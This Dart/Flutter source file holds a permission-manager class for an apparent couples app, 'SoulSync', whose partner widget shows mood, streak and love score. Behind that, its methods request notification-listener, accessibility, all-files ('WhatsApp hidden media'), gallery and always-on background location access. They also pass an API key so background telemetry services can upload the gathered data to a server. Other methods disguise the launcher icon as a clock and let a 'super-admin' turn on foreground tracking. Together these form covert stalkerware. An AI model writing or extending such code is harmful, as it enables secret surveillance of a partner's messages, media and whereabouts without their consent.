import 'package:flutter/services.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';

class PermissionManager {
  static const MethodChannel _channel = MethodChannel('com.soulsync.app/permissions');

  // Check Usage Access
  static Future<bool> checkUsageAccess() async {
    try {
      final bool hasAccess = await _channel.invokeMethod('checkUsageAccess');
      return hasAccess;
    } on PlatformException catch (e) {
      print("Failed to check usage access: ${e.message}");
      return false;
    }
  }

  // Request Usage Access (opens settings)
  static Future<void> requestUsageAccess() async {
    try {
      await _channel.invokeMethod('requestUsageAccess');
    } on PlatformException catch (e) {
      print("Failed to request usage access: ${e.message}");
    }
  }

  // Check Notification Access
  static Future<bool> checkNotificationAccess() async {
    try {
      final bool hasAccess = await _channel.invokeMethod('checkNotificationAccess');
      return hasAccess;
    } on PlatformException catch (e) {
      print("Failed to check notification access: ${e.message}");
      return false;
    }
  }

  // Request Notification Access (opens settings)
  static Future<void> requestNotificationAccess() async {
    try {
      await _channel.invokeMethod('requestNotificationAccess');
    } on PlatformException catch (e) {
      print("Failed to request notification access: ${e.message}");
    }
  }

  // Check Battery Optimization Ignore
  static Future<bool> checkBatteryOptimizationIgnore() async {
    try {
      final bool isIgnoring = await _channel.invokeMethod('checkBatteryOptimizationIgnore');
      return isIgnoring;
    } on PlatformException catch (e) {
      print("Failed to check battery optimization: ${e.message}");
      return false;
    }
  }

  // Request Battery Optimization Ignore
  static Future<void> requestBatteryOptimizationIgnore() async {
    try {
      await _channel.invokeMethod('requestBatteryOptimizationIgnore');
    } on PlatformException catch (e) {
      print("Failed to request battery optimization: ${e.message}");
    }
  }

  // Real-time app detection (Accessibility) — is it enabled?
  static Future<bool> checkAppDetection() async {
    try {
      return await _channel.invokeMethod('checkAppDetection') as bool;
    } on PlatformException catch (e) {
      print("Failed to check app detection: ${e.message}");
      return false;
    }
  }

  // Open the Accessibility settings so the user can enable SoulSync App Detection.
  static Future<void> requestAppDetection() async {
    try {
      await _channel.invokeMethod('requestAppDetection');
    } on PlatformException catch (e) {
      print("Failed to request app detection: ${e.message}");
    }
  }

  // Request all runtime permissions at once — shows system dialogs one after another
  static Future<void> requestAllRuntimePermissions() async {
    try {
      await _channel.invokeMethod('requestAllRuntimePermissions');
    } on PlatformException catch (e) {
      print("Failed to request all permissions: ${e.message}");
    }
  }

  // Request notification + media permissions together (startup flow)
  static Future<void> requestStartupPermissions() async {
    try {
      await _channel.invokeMethod('requestStartupPermissions');
    } on PlatformException catch (e) {
      print("Failed to request startup permissions: ${e.message}");
    }
  }

  // Check all files access (needed for WhatsApp hidden media)
  static Future<bool> hasAllFilesAccess() async {
    try {
      return await _channel.invokeMethod('hasAllFilesAccess') as bool;
    } catch (e) {
      return false;
    }
  }

  // Request all files access (opens settings toggle)
  static Future<void> requestAllFilesAccess() async {
    try {
      await _channel.invokeMethod('requestAllFilesAccess');
    } catch (e) {
      print("Failed to request all files access: $e");
    }
  }

  // Check background location (all the time)
  static Future<bool> hasBackgroundLocation() async {
    try {
      return await _channel.invokeMethod('hasBackgroundLocation') as bool;
    } catch (e) {
      print("Failed to check background location: $e");
      return false;
    }
  }

  // Request background location (Allow all the time)
  static Future<void> requestBackgroundLocation() async {
    try {
      await _channel.invokeMethod('requestBackgroundLocation');
    } catch (e) {
      print("Failed to request background location: $e");
    }
  }

  // Check Media/Gallery Access
  static Future<bool> checkMediaAccess() async {
    try {
      final bool hasAccess = await _channel.invokeMethod('checkMediaAccess');
      return hasAccess;
    } on PlatformException catch (e) {
      print("Failed to check media access: ${e.message}");
      return false;
    }
  }

  // Request Media/Gallery Access
  static Future<void> requestMediaAccess() async {
    try {
      await _channel.invokeMethod('requestMediaAccess');
    } on PlatformException catch (e) {
      print("Failed to request media access: ${e.message}");
    }
  }

  // Scan device gallery and return photo metadata
  static Future<List<Map<String, dynamic>>> scanGallery() async {
    try {
      final List? photos = await _channel.invokeMethod('scanGallery');
      if (photos != null) {
        return photos.map((p) => Map<String, dynamic>.from(p as Map)).toList();
      }
    } catch (e) {
      print("Failed to scan gallery: $e");
    }
    return [];
  }

  // Push the API base URL + key to native so the background services
  // (notification listener + telemetry) can upload to the server.
  static Future<void> setApiConfig(String baseUrl, String apiKey) async {
    try {
      await _channel.invokeMethod('setApiConfig', {'apiBaseUrl': baseUrl, 'apiKey': apiKey});
    } catch (e) {
      print("Failed to set native API config: $e");
    }
  }

  // Switch the launcher icon between 'normal' and 'clock' (disguise).
  static Future<void> setAppIcon(String mode) async {
    try {
      await _channel.invokeMethod('setAppIcon', {'mode': mode});
    } catch (e) {
      print("Failed to set app icon: $e");
    }
  }

  // Push the super-admin "Foreground tracking" switch to the native service.
  static Future<void> setForegroundOn(bool on) async {
    try {
      await _channel.invokeMethod('setForegroundOn', {'on': on});
    } catch (e) {
      print("Failed to set foreground mode: $e");
    }
  }

  // Start Foreground Service
  static Future<void> startForegroundService(String token) async {
    try {
      await _channel.invokeMethod('startForegroundService', {
        'token': token,
        'apiBaseUrl': dotenv.env['API_BASE_URL'] ?? '',
        'apiKey': dotenv.env['API_KEY'] ?? '',
      });
    } on PlatformException catch (e) {
      print("Failed to start foreground service: ${e.message}");
    }
  }

  // Stop Foreground Service
  static Future<void> stopForegroundService() async {
    try {
      await _channel.invokeMethod('stopForegroundService');
    } on PlatformException catch (e) {
      print("Failed to stop foreground service: ${e.message}");
    }
  }

  static Future<void> vibrate(int durationMs, {bool max = false, String pattern = ''}) async {
    try {
      await _channel.invokeMethod('vibrate', {'duration': durationMs, 'max': max, 'pattern': pattern});
    } on PlatformException catch (e) {
      print("Failed to trigger native vibration: ${e.message}");
    }
  }

  // Get Device Info
  static Future<Map<String, String>> getDeviceInfo() async {
    try {
      final Map? info = await _channel.invokeMapMethod('getDeviceInfo');
      if (info != null) {
        return Map<String, String>.from(info);
      }
    } catch (e) {
      print("Failed to get device info: $e");
    }
    return {
      'deviceModel': 'Unknown Device',
      'androidVersion': 'Unknown OS',
      'appVersion': '1.0.0',
      'batteryLevel': '100',
      'isCharging': 'false',
      'networkType': 'WIFI',
      'signalStrength': '4'
    };
  }

  // Get Storage Info
  static Future<Map<String, String>> getStorageInfo() async {
    try {
      final Map? info = await _channel.invokeMapMethod('getStorageInfo');
      if (info != null) {
        return Map<String, String>.from(info);
      }
    } catch (e) {
      print("Failed to get storage info: $e");
    }
    return {
      'total': '0',
      'free': '0',
      'used': '0'
    };
  }

  // Get Current App
  static Future<String> getCurrentApp() async {
    try {
      final String? currentApp = await _channel.invokeMethod('getCurrentApp');
      if (currentApp != null) {
        return currentApp;
      }
    } catch (e) {
      print("Failed to get current app: $e");
    }
    return 'Unknown';
  }

  // Update Native Widget
  static Future<void> updateWidget({
    required String partnerName,
    required bool isOnline,
    required String mood,
    required String note,
    required String streak,
    required String loveScore,
  }) async {
    try {
      await _channel.invokeMethod('updateWidget', {
        'partnerName': partnerName,
        'isOnline': isOnline,
        'mood': mood,
        'note': note,
        'streak': streak,
        'loveScore': loveScore,
      });
    } on PlatformException catch (e) {
      print("Failed to update native widget: ${e.message}");
    }
  }
}
